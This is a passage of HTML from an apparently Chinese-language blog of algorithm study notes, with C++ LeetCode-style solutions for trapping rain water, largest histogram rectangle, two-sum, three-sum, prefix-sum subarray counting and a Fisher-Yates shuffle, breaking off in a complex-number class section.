class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int trap(vector&lt;int&gt;&amp; height) &#123;</span><br><span class="line">        //暴力</span><br><span class="line">        //按列进行求取，i=0和size-1时柱子不能蓄水</span><br><span class="line">        //i位置储水高度为左右最大值中最小值-当前高度(大于0才能储水)</span><br><span class="line">        int n=height.size();</span><br><span class="line">        int h=0;</span><br><span class="line">        int ans=0;</span><br><span class="line">        vector&lt;int&gt; leftmax(n,0);</span><br><span class="line">        vector&lt;int&gt; rightmax(n,0);</span><br><span class="line">        //leftmax[i]表示[0,i-1]中最大的</span><br><span class="line">        for(int i=1;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            leftmax[i]=max(leftmax[i-1],height[i-1]);</span><br><span class="line">        &#125;</span><br><span class="line">        //rightmax[j]表示[j+1,n-1]最大的</span><br><span class="line">        for(int j=n-2;j&gt;=0;j--)</span><br><span class="line">        &#123;</span><br><span class="line">            rightmax[j]=max(rightmax[j+1],height[j+1]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for(int i=1;i&lt;n-1;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            h=min(leftmax[i],rightmax[i])-height[i];</span><br><span class="line">            if(h&gt;0)</span><br><span class="line">                ans+=h;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路2：单调栈，栈为单调递增栈(栈顶到栈底单调递增)，判断刚入栈元素，栈顶和栈顶下面那个元素形成凹槽则可以计算，等于当前元素等于栈顶直接加入</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210819161704126.png" alt="image-20210819161704126"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int trap(vector&lt;int&gt;&amp; height) &#123; </span><br><span class="line">        stack&lt;int&gt; st;</span><br><span class="line">        int sum = 0;</span><br><span class="line">        for (int i = 0; i &lt; height.size(); i++) &#123;</span><br><span class="line">            while (!st.empty() &amp;&amp; height[i] &gt; height[st.top()]) &#123;</span><br><span class="line">                int mid = st.top();</span><br><span class="line">                st.pop();</span><br><span class="line">                if (!st.empty()) &#123;</span><br><span class="line">                    int h = min(height[st.top()], height[i]) - height[mid];</span><br><span class="line">                    int w = i - st.top() - 1;</span><br><span class="line">                    sum += h * w;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            st.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="柱状图中最大矩阵"><a href="#柱状图中最大矩阵" class="headerlink" title="柱状图中最大矩阵"></a>柱状图中最大矩阵</h3><p><img src="https://assets.leetcode.com/uploads/2021/01/04/histogram.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">思路：单调递减栈(栈顶到栈底单调递减)</span><br><span class="line">1.heights[i]&gt;height[sta.top()]，加入sta</span><br><span class="line">2.heights[i]==sta.top(),加入sta</span><br><span class="line">3.heights[i]&lt;height[sta.top()]，当前i是小于height[sta.top]的右边界，sta.pop()之后，sta如果为空则说明只有一个右边界，不为空说明此时的sta.top()为小于上一个sta.top()的左边界，定位这两个左右边界便可以求出我们的以i为中心的最大面积，即可以判断出当前小于sta.top()的左右边界，可以计算最大面积</span><br><span class="line">注意没有右边界或者左边界的情况</span><br><span class="line">[2,4] 2和4都没有右边界，可以人工加一个0</span><br><span class="line">[1] 1没有左边界，人工加一个0</span><br><span class="line">heights.insert(heights.begin(),0);</span><br><span class="line">heights.push_back(0);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int largestRectangleArea(vector&lt;int&gt;&amp; heights) &#123;</span><br><span class="line">        int ans=0;</span><br><span class="line">        heights.insert(heights.begin(),0);</span><br><span class="line">        heights.push_back(0);</span><br><span class="line">        int n=heights.size();</span><br><span class="line">        stack&lt;int&gt; sta;</span><br><span class="line">        int h=0;</span><br><span class="line">        int w=0;</span><br><span class="line">        int mid=0;</span><br><span class="line">        int left=0;</span><br><span class="line">        int right=0;</span><br><span class="line">        for(int i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            while(!sta.empty()&amp;&amp;heights[sta.top()]&gt;heights[i])</span><br><span class="line">            &#123;</span><br><span class="line">                mid=sta.top();</span><br><span class="line">                sta.pop();</span><br><span class="line">                h=heights[mid];</span><br><span class="line">                left=sta.empty()?i-1:sta.top();</span><br><span class="line">                right=i;</span><br><span class="line">                w=right-left-1;</span><br><span class="line">                ans=max(ans,h*w);</span><br><span class="line">            &#125;</span><br><span class="line">            sta.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p>不允许排序则采用暴力或者哈希表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;</span><br><span class="line">        unordered_map&lt;int,int&gt; hash;</span><br><span class="line">        for(int i=0;i&lt;nums.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(hash.find(target-nums[i])!=hash.end())</span><br><span class="line">            &#123;</span><br><span class="line">                return &#123;hash[target-nums[i]],i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hash[nums[i]]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        return &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>允许排序，采用左右双指针，两指针所在元素&gt;target,右指针左移;两指针元素&lt;target,左指针右移，直到==</p><p>所以当要返回下标时，不应该排序</p><h3 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h3><p>求所有按照元素顺序排序的a+b+c=0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; twosum(vector&lt;int&gt;&amp; nums,int endIndex,int target)</span><br><span class="line">    &#123;</span><br><span class="line">        unordered_map&lt;int,int&gt; hash;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">        for(int i=0;i&lt;endIndex;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(auto key:hash)</span><br><span class="line">            &#123;</span><br><span class="line">                if(key.first==target-nums[i])</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.push_back(&#123;key.first,nums[i]&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            hash[nums[i]]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; tmp;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">        for(int i=0;i&lt;nums.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp=twosum(nums,i,-nums[i]);</span><br><span class="line">            if(!tmp.empty())</span><br><span class="line">            &#123;</span><br><span class="line">                for(auto&amp; num:tmp)</span><br><span class="line">                    ans.push_back(&#123;num[0],num[1],nums[i]&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="求不重复的a-b-c-0"><a href="#求不重复的a-b-c-0" class="headerlink" title="求不重复的a+b+c=0"></a>求不重复的a+b+c=0</h3><p>排序后双指针，同时对i,left,right三个位置去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; tmp;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">        int left=0;</span><br><span class="line">        int right=0;</span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        for(int i=0;i&lt;nums.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">//i去重</span><br><span class="line">            if(i&gt;0&amp;&amp;nums[i]==nums[i-1])</span><br><span class="line">            &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            left=i+1;</span><br><span class="line">            right=nums.size()-1;</span><br><span class="line">            while(left&lt;right)</span><br><span class="line">            &#123;</span><br><span class="line">                //left去重</span><br><span class="line">                if(left&gt;i+1&amp;&amp;nums[left]==nums[left-1])</span><br><span class="line">                &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                //right去重</span><br><span class="line">                if(right&lt;nums.size()-1&amp;&amp;nums[right]==nums[right+1])</span><br><span class="line">                &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                //right去重</span><br><span class="line">                </span><br><span class="line">                if(nums[left]+nums[right]==-nums[i])</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.push_back( &#123;nums[i],nums[left],nums[right]&#125; );</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(nums[left]+nums[right]&gt;-nums[i])</span><br><span class="line">                &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.一般prefix[i]表示包含i个数字的前缀和</span><br><span class="line">2.使用上述prefix定义不需要再向hash中push hash[0]=1</span><br><span class="line">3.查找时从i=1开始</span><br><span class="line"></span><br><span class="line">当遍历时，从1~nums.size(),进来就hash先加上上一个元素的prefix，这样可以添加到prefix[0]这个元素，就不再需要提前添加了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int subarraySum(vector&lt;int&gt;&amp; nums, int k) &#123;</span><br><span class="line">    vector&lt;int&gt; prefix(nums.size()+1,0);</span><br><span class="line">    unordered_map&lt;int,int&gt; hash;</span><br><span class="line">    for(int i=1;i&lt;=nums.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        prefix[i]=prefix[i-1]+nums[i-1];</span><br><span class="line">    &#125;</span><br><span class="line">    int count=0;</span><br><span class="line">    for(int i=1;i&lt;=nums.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        hash[prefix[i-1]]++;</span><br><span class="line">        if(hash.count(prefix[i]-k))</span><br><span class="line">        &#123;</span><br><span class="line">            count+=hash[prefix[i]-k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">vector&lt;vector&lt;int&gt;&gt; sumk(vector&lt;int&gt; input,int k)</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">    vector&lt;int&gt; prefix(input.size()+1);</span><br><span class="line">    for(int i=0;i&lt;input.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        prefix[i+1]=prefix[i]+input[i];</span><br><span class="line">    &#125;</span><br><span class="line">    int count=0;</span><br><span class="line">    unordered_map&lt;int,int&gt; hash;</span><br><span class="line">    //key=前缀和 value=个数</span><br><span class="line">    unordered_map&lt;int,int&gt; hashi;</span><br><span class="line">    hashi[0]=-1;</span><br><span class="line">    hash[0]=1;</span><br><span class="line">    for(int i=1;i&lt;=input.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(hash.count(prefix[i]-k))</span><br><span class="line">        &#123;</span><br><span class="line">            if(hashi[prefix[i]-k]==-1)</span><br><span class="line">            &#123;</span><br><span class="line">                ans.push_back(&#123;0,i-1&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                ans.push_back(&#123;hashi[prefix[i]-k],i-1&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            count+=hash[prefix[i]-k];</span><br><span class="line">        &#125;</span><br><span class="line">        hash[prefix[i]]++;</span><br><span class="line">        hashi[prefix[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; input&#123;1,2,3,4&#125;;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; ans=sumk(input,7);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="不同定义下的prefix"><a href="#不同定义下的prefix" class="headerlink" title="不同定义下的prefix"></a>不同定义下的prefix</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">vector&lt;vector&lt;int&gt;&gt; sumk(vector&lt;int&gt; input,int k)</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">    //prefix[i]定义为以nums[i]结尾的前缀和</span><br><span class="line">    vector&lt;int&gt; prefix(input.size());</span><br><span class="line">    prefix[0]=input[0];</span><br><span class="line">    for(int i=1;i&lt;input.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        prefix[i]=prefix[i-1]+input[i];</span><br><span class="line">    &#125;</span><br><span class="line">    int count=0;</span><br><span class="line">    unordered_map&lt;int,int&gt; hash;</span><br><span class="line">    unordered_map&lt;int,int&gt; hash_index;</span><br><span class="line">    //key=前缀和 value=个数</span><br><span class="line">    hash[0]=1;</span><br><span class="line">    hash_index[0]=-1;</span><br><span class="line">    for(int i=0;i&lt;input.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(hash.count(prefix[i]-k))</span><br><span class="line">        &#123;</span><br><span class="line">            if(hash_index[prefix[i]-k]==-1)</span><br><span class="line">            &#123;</span><br><span class="line">                vector&lt;int&gt; tmp;</span><br><span class="line">                for(int j=0;j&lt;=i;j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    tmp.push_back(input[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                ans.push_back(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                vector&lt;int&gt; tmp1;</span><br><span class="line">                for(int j=hash_index[prefix[i]-k]+1;j&lt;=i;j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    tmp1.push_back(input[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                ans.push_back(tmp1);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            count+=hash[prefix[i]-k];</span><br><span class="line">        &#125;</span><br><span class="line">        hash[prefix[i]]++;</span><br><span class="line">        hash_index[prefix[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; input&#123;1,2,3,4&#125;;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; ans=sumk(input,7);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="洗牌算法-shuffle"><a href="#洗牌算法-shuffle" class="headerlink" title="洗牌算法(shuffle)"></a>洗牌算法(shuffle)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(int i=ans.size()-1;i&gt;=0;i--)</span><br><span class="line">&#123;</span><br><span class="line">    int ran=rand()%(i+1);</span><br><span class="line">    swap(ans[i],ans[ran]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实现复数类complex"><a href="#实现复数类complex" class="headerlink" title="实现复数类complex"></a>实现复数类complex</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span 